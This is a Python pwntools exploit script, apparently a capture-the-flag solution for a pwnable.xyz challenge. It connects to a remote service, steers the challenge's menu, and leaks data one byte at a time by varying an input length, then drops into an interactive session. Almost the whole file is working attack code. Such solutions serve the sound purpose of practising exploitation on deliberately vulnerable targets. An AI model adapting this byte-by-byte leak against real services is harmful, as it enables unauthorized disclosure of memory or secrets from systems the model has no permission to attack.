#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30006)
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

io.recvuntil("> ")
io.sendline('3')
io.recvuntil("? ")
io.send('y')
io.sendline('123')

io.recvuntil("> ")
io.sendline('1')
io.recvuntil("len: ")
io.sendline('64')


def one(l):
    io.recvuntil("> ")
    io.sendline('1')
    io.recvuntil("len: ")
    io.sendline(str(l))

    io.recvuntil("> ")
    io.sendline('2')

    io.sendline('3')
    io.recvuntil("? ")
    io.send('n')

    return io.recvline()

s = ''
for i in range(1, 64):
    s += one(i)[i:i+1]
    print(s)

io.interactive()
